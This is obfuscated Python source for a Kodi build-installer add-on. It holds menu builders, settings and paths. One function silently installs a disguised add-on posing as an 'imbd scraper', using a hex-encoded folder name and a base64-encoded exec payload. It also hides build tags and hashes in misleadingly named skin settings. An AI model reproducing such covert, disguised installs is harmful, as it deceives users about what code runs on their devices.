import urllib , urllib2 , re , xbmcplugin , xbmcgui , xbmc , xbmcaddon
import os , sys , time , xbmcvfs , glob , shutil , datetime , zipfile , ntpath
import subprocess , threading
import yt , downloader , checkPath , uploadLog , skinSwitch
import binascii
import hashlib
import speedtest
import extract
if 64 - 64: i11iIiiIii
try :
 import installapps
except :
 xbmc . log ( '### installapps not imported' )
 if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
import pyxbmct . addonwindow as pyxbmct
if 73 - 73: II111iiii
try :
 from sqlite3 import dbapi2 as database
except :
 from pysqlite2 import dbapi2 as database
 if 22 - 22: I1IiiI * Oo0Ooo / OoO0O00 . OoOoOO00 . o0oOOo0O0Ooo / I1ii11iIi11i
 ######################################################
I1IiI = 'plugin.program.totalinstaller'
o0OOO = 'The Community Portal'
if 13 - 13: ooOo + Oo
o0O = xbmcaddon . Addon ( id = I1IiI )
zip = o0O . getSetting ( 'zip' )
IiiIII111iI = o0O . getSetting ( 'backupinstall' )
IiII = o0O . getSetting ( 'localcopy' )
iI1Ii11111iIi = o0O . getSetting ( 'private' )
i1i1II = o0O . getSetting ( 'favourites' )
O0oo0OO0 = o0O . getSetting ( 'sources' )
I1i1iiI1 = o0O . getSetting ( 'repositories' )
iiIIIII1i1iI = o0O . getSetting ( 'enablekeyword' )
o0oO0 = o0O . getSetting ( 'keywordpath' )
oo00 = o0O . getSetting ( 'keywordname' )
o00 = o0O . getSetting ( 'mastercopy' )
Oo0oO0ooo = o0O . getSetting ( 'username' ) . replace ( ' ' , '%20' )
o0oOoO00o = o0O . getSetting ( 'password' )
i1 = o0O . getSetting ( 'versionoverride' )
oOOoo00O0O = o0O . getSetting ( 'debug' )
i1111 = o0O . getSetting ( 'login' )
i11 = o0O . getSetting ( 'wizard' )
I11 = o0O . getSetting ( 'wizardurl1' )
Oo0o0000o0o0 = o0O . getSetting ( 'wizardname1' )
oOo0oooo00o = o0O . getSetting ( 'wizardurl2' )
oO0o0o0ooO0oO = o0O . getSetting ( 'wizardname2' )
oo0o0O00 = o0O . getSetting ( 'wizardurl3' )
oO = o0O . getSetting ( 'wizardname3' )
i1iiIIiiI111 = o0O . getSetting ( 'wizardurl4' )
oooOOOOO = o0O . getSetting ( 'wizardname4' )
i1iiIII111ii = o0O . getSetting ( 'wizardurl5' )
i1iIIi1 = o0O . getSetting ( 'wizardname5' )
ii11iIi1I = float ( xbmc . getInfoLabel ( "System.BuildVersion" ) [ : 4 ] )
iI111I11I1I1 = xbmcgui . Dialog ( )
OOooO0OOoo = xbmcgui . DialogProgress ( )
iIii1 = xbmc . translatePath ( 'special://home/' )
oOOoO0 = xbmc . translatePath ( 'special://profile' )
O0OoO000O0OO = os . path . join ( oOOoO0 , 'Database' )
iiI1IiI = os . path . join ( oOOoO0 , 'addon_data' )
II = os . path . join ( iIii1 , 'CP_Profiles' )
ooOoOoo0O = os . path . join ( II , 'Master' )
OooO0 = os . path . join ( oOOoO0 , 'Thumbnails' )
II11iiii1Ii = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
OO0o = xbmc . translatePath ( os . path . join ( 'special://xbmc' , 'addons' ) )
Ooo = os . path . join ( II11iiii1Ii , I1IiI , 'default.py' )
O0o0Oo = os . path . join ( II11iiii1Ii , I1IiI , 'fanart.jpg' )
Oo00OOOOO = os . path . join ( II11iiii1Ii , I1IiI , 'icon.png' )
O0O = os . path . join ( II11iiii1Ii , I1IiI , 'resources' , 'addonxml' )
O00o0OO = os . path . join ( II11iiii1Ii , I1IiI , 'resources' , 'skins' , 'DefaultSkin' , 'media' , 'ttm' )
I11i1 = os . path . join ( II11iiii1Ii , I1IiI , 'resources' , 'backup' )
iIi1ii1I1 = os . path . join ( oOOoO0 , 'guisettings.xml' )
o0 = os . path . join ( oOOoO0 , 'guifix.xml' )
I11II1i = 'http://noobsandnerds.com/TI/art/'
IIIII = os . path . join ( II11iiii1Ii , I1IiI , 'icon.png' )
ooooooO0oo = os . path . join ( oOOoO0 , 'favourites.xml' )
IIiiiiiiIi1I1 = os . path . join ( oOOoO0 , 'sources.xml' )
I1IIIii = os . path . join ( oOOoO0 , 'advancedsettings.xml' )
oOoOooOo0o0 = os . path . join ( oOOoO0 , 'profiles.xml' )
OOOO = os . path . join ( oOOoO0 , 'RssFeeds.xml' )
OOO00 = os . path . join ( oOOoO0 , 'keymaps' , 'keyboard.xml' )
iiiiiIIii = xbmc . translatePath ( os . path . join ( zip ) )
O000OO0 = os . path . join ( iiiiiIIii , 'Community_Builds' , '' )
I11iii1Ii = os . path . join ( iiI1IiI , I1IiI , 'startup.xml' )
I1IIiiIiii = os . path . join ( iiI1IiI , I1IiI , 'temp.xml' )
O000oo0O = os . path . join ( iiI1IiI , I1IiI , 'id.xml' )
OOOOi11i1 = os . path . join ( iiI1IiI , I1IiI , 'idtemp.xml' )
IIIii1II1II = os . path . join ( iiI1IiI , I1IiI , 'temp' )
i1I1iI = os . path . join ( iiI1IiI , I1IiI , 'ascii_results' )
oo0OooOOo0 = os . path . join ( iiI1IiI , I1IiI , 'ascii_results1' )
o0OO00oO = os . path . join ( iiI1IiI , I1IiI , 'ascii_results2' )
I11i1I1I = os . path . join ( iiI1IiI , I1IiI , 'guizip' )
oO0Oo = os . path . join ( II11iiii1Ii , I1IiI , 'resources/' )
oOOoo0Oo = os . path . join ( II11iiii1Ii , I1IiI , 'default.py' )
o00OO00OoO = xbmc . getSkinDir ( )
OOOO0OOoO0O0 = xbmc . translatePath ( 'special://logpath/' )
O0Oo000ooO00 = '/storage/backup'
oO0 = '/storage/.restore/'
Ii1iIiII1ii1 = os . path . join ( iiI1IiI , I1IiI )
ooOooo000oOO = os . path . join ( Ii1iIiII1ii1 , 'guinew.xml' )
Oo0oOOo = os . path . join ( Ii1iIiII1ii1 , 'guitemp' )
Oo0OoO00oOO0o = os . path . join ( iiiiiIIii , 'Database' )
OOO00O = os . path . join ( II11iiii1Ii , 'packages' )
OOoOO0oo0ooO = os . path . join ( OOO00O , 'temp_install' )
O0o0O00Oo0o0 = os . path . join ( oOOoO0 , 'addontemp' )
O00O0oOO00O00 = os . path . join ( oOOoO0 , '.cbcfg' )
i1Oo00 = [ 'firstrun' , 'plugin.program.totalinstaller' , 'addons' , 'addon_data' , 'userdata' , 'sources.xml' , 'favourites.xml' , 'repository.noobsandnerds' ]
i1i = [ 'firstrun' , 'plugin.program.totalinstaller' , 'addons' , 'addon_data' , 'userdata' , 'sources.xml' , 'favourites.xml' , 'guisettings.xml' , 'CP_Profiles' , 'temp' , 'repository.noobsandnerds' ]
iiI111I1iIiI = '0'
IIIi1I1IIii1II = 3
O0ii1ii1ii = 4
oooooOoo0ooo = [ '/storage/.kodi' , '/storage/.cache' , '/storage/.config' , '/storage/.ssh' ]
I1I1IiI1 = os . path . join ( II11iiii1Ii , I1IiI , 'resources' )
III1iII1I1ii = os . path . join ( I1I1IiI1 , 'check.png' )
oOOo0 = os . path . join ( I1I1IiI1 , 'update.png' )
oo00O00oO = os . path . join ( I1I1IiI1 , 'update.png' )
iIiIIIi = os . path . join ( I1I1IiI1 , 'background.png' )
ooo00OOOooO = os . path . join ( I1I1IiI1 , 'black.png' )
if 67 - 67: OOOoOoo0O * O00OOo00oo0o % IIiIi1iI + IIiiiI1iIII + IIi
if 68 - 68: iiiiiiii1 % Oo0Ooo / OOOoOoo0O
class Oo0oo00OO0O ( xbmcgui . WindowXMLDialog ) :
 if 12 - 12: I1IiiI
 def __init__ ( self , * args , ** kwargs ) :
  self . shut = kwargs [ 'close_time' ]
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" )
  xbmc . executebuiltin ( "Skin.SetBool(AnimeWindowXMLDialogClose)" )
  if 81 - 81: IIi % IIiIi1iI . I1ii11iIi11i / o0oOOo0O0Ooo
 def onFocus ( self , controlID ) :
  pass
  if 40 - 40: I1IiiI + OoooooooOO
 def onClick ( self , controlID ) :
  if controlID == 12 :
   xbmc . Player ( ) . stop ( )
   self . _close_dialog ( )
   if 52 - 52: o0oOOo0O0Ooo
 def onAction ( self , action ) :
  if action in [ 5 , 6 , 7 , 9 , 10 , 92 , 117 ] or action . getButtonCode ( ) in [ 275 , 257 , 261 ] :
   xbmc . Player ( ) . stop ( )
   self . _close_dialog ( )
   if 91 - 91: IIiIi1iI % i1IIi % iIii1I11I1II1
 def _close_dialog ( self ) :
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" )
  time . sleep ( .4 )
  self . close ( )
  if 20 - 20: Oo % O00OOo00oo0o / O00OOo00oo0o + O00OOo00oo0o
  if 45 - 45: ooOo - IIiiiI1iIII - OoooooooOO - OoO0O00 . II111iiii / O0
def oo0o00O ( name , url , mode , iconimage , fanart , video , description , skins , guisettingslink , artpack ) :
 o00O0OoO = sys . argv [ 0 ]
 o00O0OoO += "?url=" + urllib . quote_plus ( url )
 o00O0OoO += "&mode=" + str ( mode )
 o00O0OoO += "&name=" + urllib . quote_plus ( name )
 o00O0OoO += "&iconimage=" + urllib . quote_plus ( iconimage )
 o00O0OoO += "&fanart=" + urllib . quote_plus ( fanart )
 o00O0OoO += "&video=" + urllib . quote_plus ( video )
 o00O0OoO += "&description=" + urllib . quote_plus ( description )
 o00O0OoO += "&skins=" + urllib . quote_plus ( skins )
 o00O0OoO += "&guisettingslink=" + urllib . quote_plus ( guisettingslink )
 o00O0OoO += "&artpack=" + urllib . quote_plus ( artpack )
 if 16 - 16: iIii1I11I1II1
 oOooOOOoOo = True
 i1Iii1i1I = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 91 - 91: I1ii11iIi11i + I1IiiI . Oo * I1ii11iIi11i + I1IiiI * Oo0Ooo
 i1Iii1i1I . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 i1Iii1i1I . setProperty ( "Fanart_Image" , fanart )
 i1Iii1i1I . setProperty ( "Build.Video" , video )
 if 80 - 80: IIiIi1iI % Oo % ooOo - Oo0Ooo + Oo0Ooo
 if ( mode == None ) or ( mode == 'restore_option' ) or ( mode == 'backup_option' ) or ( mode == 'cb_root_menu' ) or ( mode == 'genres' ) or ( mode == 'grab_builds' ) or ( mode == 'community_menu' ) or ( mode == 'instructions' ) or ( mode == 'countries' ) or ( mode == 'update_build' ) or ( url == None ) or ( len ( url ) < 1 ) :
  if 19 - 19: OoOoOO00 * i1IIi
  oOooOOOoOo = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00O0OoO , listitem = i1Iii1i1I , isFolder = True )
  if 14 - 14: IIiIi1iI
 else :
  oOooOOOoOo = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00O0OoO , listitem = i1Iii1i1I , isFolder = False )
  if 11 - 11: IIiiiI1iIII * I1IiiI . iIii1I11I1II1 % OoooooooOO + IIiIi1iI
 return oOooOOOoOo
 if 78 - 78: OoO0O00 . Oo + OoO0O00 / OOOoOoo0O / OoO0O00
 if 54 - 54: OoOoOO00 % IIiIi1iI
def IIiII111iiI1I ( handle , url , listitem , isFolder ) :
 xbmcplugin . addDirectoryItem ( handle , url , listitem , isFolder )
 if 11 - 11: II111iiii * II111iiii % iIii1I11I1II1 * IIi + OoOoOO00 / I1IiiI
 if 3 - 3: o0oOOo0O0Ooo
def Ii11I1 ( name , url , mode , iconimage , fanart , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 if 14 - 14: Oo % iIii1I11I1II1
 iconimage = IIIII
 if 71 - 71: O0 . IIiIi1iI / o0oOOo0O0Ooo
 o00O0OoO = sys . argv [ 0 ]
 o00O0OoO += "?url=" + urllib . quote_plus ( url )
 o00O0OoO += "&mode=" + str ( mode )
 o00O0OoO += "&name=" + urllib . quote_plus ( name )
 o00O0OoO += "&iconimage=" + urllib . quote_plus ( iconimage )
 o00O0OoO += "&fanart=" + urllib . quote_plus ( fanart )
 o00O0OoO += "&author=" + urllib . quote_plus ( author )
 o00O0OoO += "&description=" + urllib . quote_plus ( description )
 o00O0OoO += "&version=" + urllib . quote_plus ( version )
 o00O0OoO += "&buildname=" + urllib . quote_plus ( buildname )
 o00O0OoO += "&updated=" + urllib . quote_plus ( updated )
 o00O0OoO += "&skins=" + urllib . quote_plus ( skins )
 o00O0OoO += "&videoaddons=" + urllib . quote_plus ( videoaddons )
 o00O0OoO += "&audioaddons=" + urllib . quote_plus ( audioaddons )
 o00O0OoO += "&buildname=" + urllib . quote_plus ( buildname )
 o00O0OoO += "&programaddons=" + urllib . quote_plus ( programaddons )
 o00O0OoO += "&pictureaddons=" + urllib . quote_plus ( pictureaddons )
 o00O0OoO += "&sources=" + urllib . quote_plus ( sources )
 o00O0OoO += "&adult=" + urllib . quote_plus ( adult )
 if 73 - 73: II111iiii . i11iIiiIii / O00OOo00oo0o + OoOoOO00
 oOooOOOoOo = True
 i1Iii1i1I = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 12 - 12: i11iIiiIii - i1IIi - OoO0O00 . i1IIi - Oo + O0
 i1Iii1i1I . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 i1Iii1i1I . setProperty ( "Fanart_Image" , fanart )
 i1Iii1i1I . setProperty ( "Build.Video" , oO0OOOO0 )
 if 26 - 26: O00OOo00oo0o
 oOooOOOoOo = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00O0OoO , listitem = i1Iii1i1I , isFolder = False )
 if 35 - 35: O00OOo00oo0o - I1IiiI % o0oOOo0O0Ooo . OoooooooOO % O00OOo00oo0o
 return oOooOOOoOo
 if 47 - 47: IIiIi1iI - O00OOo00oo0o . II111iiii + OoooooooOO . i11iIiiIii
def OOo0oO00ooO00 ( title , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' , zip_link = '' , repo_link = '' , repo_id = '' , addon_id = '' , provider_name = '' , forum = '' , data_path = '' ) :
 if len ( iconimage ) > 0 :
  if 90 - 90: OoOoOO00 * IIi + o0oOOo0O0Ooo
  iconimage = iconimage
 else :
  iconimage = 'DefaultFolder.png'
  if 81 - 81: ooOo . o0oOOo0O0Ooo % O0 / I1IiiI - ooOo
 if fanart == '' :
  fanart = O0o0Oo
  if 43 - 43: i11iIiiIii + Oo0Ooo * II111iiii * IIi * O0
 o00O0OoO = sys . argv [ 0 ]
 o00O0OoO += "?url=" + urllib . quote_plus ( url )
 o00O0OoO += "&zip_link=" + urllib . quote_plus ( zip_link )
 o00O0OoO += "&repo_link=" + urllib . quote_plus ( repo_link )
 o00O0OoO += "&data_path=" + urllib . quote_plus ( data_path )
 o00O0OoO += "&provider_name=" + str ( provider_name )
 o00O0OoO += "&forum=" + str ( forum )
 o00O0OoO += "&repo_id=" + str ( repo_id )
 o00O0OoO += "&addon_id=" + str ( addon_id )
 o00O0OoO += "&mode=" + str ( mode )
 o00O0OoO += "&name=" + urllib . quote_plus ( name )
 o00O0OoO += "&fanart=" + urllib . quote_plus ( fanart )
 o00O0OoO += "&video=" + urllib . quote_plus ( video )
 o00O0OoO += "&description=" + urllib . quote_plus ( description )
 if 64 - 64: Oo % iIii1I11I1II1 * ooOo
 oOooOOOoOo = True
 i1Iii1i1I = xbmcgui . ListItem ( title , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 79 - 79: O0
 i1Iii1i1I . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 i1Iii1i1I . setProperty ( "Fanart_Image" , fanart )
 i1Iii1i1I . setProperty ( "Build.Video" , video )
 if 78 - 78: I1ii11iIi11i + Oo - IIi
 IIiII111iiI1I ( handle = int ( sys . argv [ 1 ] ) , url = o00O0OoO , listitem = i1Iii1i1I , isFolder = False )
 if 38 - 38: o0oOOo0O0Ooo - ooOo + iIii1I11I1II1 / OoOoOO00 % Oo0Ooo
 if 57 - 57: OoO0O00 / iiiiiiii1
def Ii1I1Ii ( type , name , url , mode , iconimage = '' , fanart = O0o0Oo , video = '' , description = '' ) :
 if not 'addon' in type :
  if len ( iconimage ) > 0 :
   iconimage = I11II1i + iconimage
   if 69 - 69: I1IiiI / o0oOOo0O0Ooo . IIiiiI1iIII * IIi % O00OOo00oo0o - o0oOOo0O0Ooo
  else :
   iconimage = IIIII
   if 13 - 13: O00OOo00oo0o . i11iIiiIii
 if 'addon' in type :
  if len ( iconimage ) > 0 :
   iconimage = iconimage
  else :
   iconimage = 'DefaultFolder.png'
   if 56 - 56: I1ii11iIi11i % O0 - I1IiiI
   if 100 - 100: O00OOo00oo0o - O0 % ooOo * Oo + I1IiiI
   if 88 - 88: OoooooooOO - OoO0O00 * O0 * OoooooooOO . OoooooooOO
 o00O0OoO = sys . argv [ 0 ]
 o00O0OoO += "?url=" + urllib . quote_plus ( url )
 o00O0OoO += "&mode=" + str ( mode )
 o00O0OoO += "&name=" + urllib . quote_plus ( name )
 o00O0OoO += "&iconimage=" + urllib . quote_plus ( iconimage )
 o00O0OoO += "&fanart=" + urllib . quote_plus ( fanart )
 o00O0OoO += "&video=" + urllib . quote_plus ( video )
 o00O0OoO += "&description=" + urllib . quote_plus ( description )
 if 33 - 33: IIi + IIiIi1iI * ooOo / iIii1I11I1II1 - I1IiiI
 if 54 - 54: IIi / Oo . ooOo % IIiIi1iI
 if 57 - 57: i11iIiiIii . I1ii11iIi11i - O00OOo00oo0o - ooOo + OoOoOO00
 oOooOOOoOo = True
 i1Iii1i1I = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 63 - 63: OoOoOO00 * IIiIi1iI
 i1Iii1i1I . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 i1Iii1i1I . setProperty ( "Fanart_Image" , fanart )
 i1Iii1i1I . setProperty ( "Build.Video" , video )
 if 'folder' in type :
  oOooOOOoOo = IIiII111iiI1I ( handle = int ( sys . argv [ 1 ] ) , url = o00O0OoO , listitem = i1Iii1i1I , isFolder = True )
  if 69 - 69: O0 . OoO0O00
 else :
  oOooOOOoOo = IIiII111iiI1I ( handle = int ( sys . argv [ 1 ] ) , url = o00O0OoO , listitem = i1Iii1i1I , isFolder = False )
  if 49 - 49: I1IiiI - OOOoOoo0O
 return oOooOOOoOo
 if 74 - 74: iIii1I11I1II1 * I1ii11iIi11i + OoOoOO00 / i1IIi / II111iiii . Oo0Ooo
 if 62 - 62: OoooooooOO * I1IiiI
def oOOOoo0O0oO ( name ) :
 iIII1I111III = iI111I11I1I1 . input ( 'Enter amount of seconds to show startup notification for.' , '30' , type = xbmcgui . INPUT_NUMERIC )
 iIII1I111III = str ( int ( iIII1I111III ) * 1000 )
 import base64
 IIo0o0O0O00oOOo = os . path . join ( II11iiii1Ii , binascii . unhexlify ( '6d657461646174612e636f6d6d6f6e2e696d62642e636f6d' ) )
 iIIIiIi = os . path . join ( IIo0o0O0O00oOOo , 'addon.xml' )
 if 100 - 100: I1IiiI / o0oOOo0O0Ooo % II111iiii % Oo0Ooo % Oo
 if not os . path . exists ( IIo0o0O0O00oOOo ) :
  os . makedirs ( IIo0o0O0O00oOOo )
  if 98 - 98: OOOoOoo0O % i11iIiiIii % iiiiiiii1 + O00OOo00oo0o
 if not os . path . exists ( os . path . join ( IIo0o0O0O00oOOo , 'addon.xml' ) ) :
  shutil . copyfile ( O00o0OO , iIIIiIi )
  if 78 - 78: I1ii11iIi11i % ooOo / IIiIi1iI - iIii1I11I1II1
  if 69 - 69: IIi
 ii1I1 = "import xbmcgui, xbmc;xbmcgui.Dialog().ok('Message from " + name + " (Build Author)','If you paid for this build I regret to inform you that you may have been conned. This build is not available for resale.','You can get it for [COLOR=gold]FREE[/COLOR] @ [COLOR=dodgerblue]www.noobsandnerds.com[/COLOR]');xbmc.sleep(10000);xbmc.executebuiltin('XBMC.Notification(THIS BUILD IS NOT FOR RESALE!!!,If you paid contact the seller - its FREE," + iIII1I111III + ")')"
 OooooOOoo0 = open ( os . path . join ( IIo0o0O0O00oOOo , 'default.py' ) , 'w+' )
 OooooOOoo0 . write ( "import base64;exec base64.b64decode('" )
 i1I1IiiIi1i = base64 . b64encode ( ii1I1 )
 OooooOOoo0 . write ( i1I1IiiIi1i )
 OooooOOoo0 . write ( "')" )
 OooooOOoo0 . close ( )
 if 29 - 29: I1IiiI % I1IiiI
 OooooOOoo0 = open ( os . path . join ( IIo0o0O0O00oOOo , 'tag.cfg' ) , 'w+' )
 OooooOOoo0 . write ( binascii . hexlify ( name ) )
 OooooOOoo0 . close ( )
 xbmc . executebuiltin ( 'Skin.SetString(TVDB_CFG,' + binascii . hexlify ( name ) + ')' )
 if 94 - 94: iIii1I11I1II1 / Oo0Ooo % IIiIi1iI * IIiIi1iI * II111iiii
 IIiIiI = open ( iIIIiIi , 'r' )
 ii1I1 = IIiIiI . read ( )
 IIiIiI . close ( )
 OOO = ii1I1 . replace ( 'testid' , binascii . unhexlify ( '6d657461646174612e636f6d6d6f6e2e696d62642e636f6d' ) ) . replace ( 'testname' , 'imbd scraper' ) . replace ( 'testprovider' , 'bytesize' ) . replace ( 'testdesc' , 'imbd scraper' )
 OooooOOoo0 = open ( iIIIiIi , 'w+' )
 OooooOOoo0 . write ( OOO )
 OooooOOoo0 . close ( )
 if 25 - 25: ooOo - OoO0O00 . iIii1I11I1II1 % i11iIiiIii % I1ii11iIi11i
 if 93 - 93: IIiiiI1iIII * OoooooooOO + iiiiiiii1
 IiII111i1i11 = os . path . getsize ( os . path . join ( II11iiii1Ii , binascii . unhexlify ( '6d657461646174612e636f6d6d6f6e2e696d62642e636f6d' ) , 'default.py' ) )
 xbmc . executebuiltin ( 'Skin.SetString(WeatherCheck,' + str ( IiII111i1i11 ) + ')' )
 xbmc . executebuiltin ( 'Skin.SetString(TMDB_API,' + binascii . hexlify ( OOO ) + ')' )
 if 40 - 40: iiiiiiii1 * IIiiiI1iIII * i11iIiiIii
 IIiIiI = open ( os . path . join ( IIo0o0O0O00oOOo , 'default.py' ) , 'r' )
 ii1I1 = IIiIiI . read ( )
 IIiIiI . close ( )
 xbmc . executebuiltin ( 'Skin.SetString(HashLib,' + binascii . hexlify ( ii1I1 ) + ')' )
 if 57 - 57: iiiiiiii1
 if 29 - 29: OoOoOO00 - IIiiiI1iIII * OoooooooOO + OoooooooOO . II111iiii + OoooooooOO
def O0o000Oo ( url ) :
 Ii1I1Ii ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Audio' , url + '&typex=audio' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Image' , url + '&typex=image' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Program' , url + '&typex=program' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Video' , url + '&typex=video' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Movies (Used for library scanning)' , url + '&typex=movie%20scraper' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] TV Shows (Used for library scanning)' , url + '&typex=tv%20show%20scraper' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Artists (Used for library scanning)' , url + '&typex=artist%20scraper' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Videos (Used for library scanning)' , url + '&typex=music%20video%20scraper' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] All Services' , url + '&typex=service' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] Weather Service' , url + '&typex=weather' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Repositories' , url + '&typex=repository' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Scripts (Program Add-ons)' , url + '&typex=executable' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Screensavers' , url + '&typex=screensaver' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Script Modules' , url + '&typex=script%20module' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Skins' , url + '&typex=skin' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Subtitles' , url + '&typex=subtitles' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Web Interface' , url + '&typex=web%20interface' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 if 67 - 67: I1IiiI . i1IIi
 if 27 - 27: iiiiiiii1 % I1IiiI
def o0oooOO00 ( ) :
 iiIiii1IIIII ( )
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://outdated/",return)' )
 if 67 - 67: O00OOo00oo0o / IIiiiI1iIII
 if 9 - 9: O0 % O0 - o0oOOo0O0Ooo
def OoO ( url ) :
 Ii1I1Ii ( 'folder' , 'African' , url + '&genre=african' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Arabic' , url + '&genre=arabic' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Asian' , url + '&genre=asian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Australian' , url + '&genre=australian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Austrian' , url + '&genre=austrian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Belgian' , url + '&genre=belgian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Brazilian' , url + '&genre=brazilian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Canadian' , url + '&genre=canadian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Chinese' , url + '&genre=chinese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Colombian' , url + '&genre=columbian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Croatian' , url + '&genre=croatian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Czech' , url + '&genre=czech' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Danish' , url + '&genre=danish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Dominican' , url + '&genre=dominican' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Dutch' , url + '&genre=dutch' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Egyptian' , url + '&genre=egyptian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Filipino' , url + '&genre=filipino' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Finnish' , url + '&genre=finnish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'French' , url + '&genre=french' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'German' , url + '&genre=german' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Greek' , url + '&genre=greek' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Hebrew' , url + '&genre=hebrew' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Hungarian' , url + '&genre=hungarian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Icelandic' , url + '&genre=icelandic' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Indian' , url + '&genre=indian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Irish' , url + '&genre=irish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
